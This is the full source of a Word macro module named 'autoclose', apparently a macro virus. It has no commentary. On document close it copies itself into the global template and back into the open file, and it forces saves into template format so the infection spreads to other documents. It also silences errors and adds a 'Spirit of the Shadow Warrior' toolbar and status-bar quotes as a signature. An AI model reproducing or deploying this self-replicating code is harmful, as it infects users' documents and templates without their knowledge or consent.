   Attribute VB_Name = "autoclose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "F%"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoclose.MAIN"
   Dim f$
   On Error Resume Next

   WordBasic.NewToolbar "Spirit of the Shadow Warrior"
   WordBasic.ViewToolbars Toolbar:="Spirit of the Shadow Warrior", Show:=1
   WordBasic.DeleteButton "Spirit of the Shadow Warrior", 1
   WordBasic.AddButton "Spirit of the Shadow Warrior", 1, 1, "autoclose", "Into a soul absolutely free from thoughts and emotions, even a tiger finds no room to insert its fierce claws...", 0, " 2 "


   f$ = WordBasic.[FileName$]()

   WordBasic.MacroCopy f$ + ":autoclose", "global:autoclose"
   WordBasic.MacroCopy "global:autoclose", f$ + ":autoclose"

   Dim s As Object: Set s = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs s
   If s.Format = 0 Then
       s.Format = 1
       WordBasic.FileSaveAs s
   End If

   WordBasic.PrintStatusBar "If you want to be heard, sometimes you must be silent. - Shadow Warrior"

   End Sub
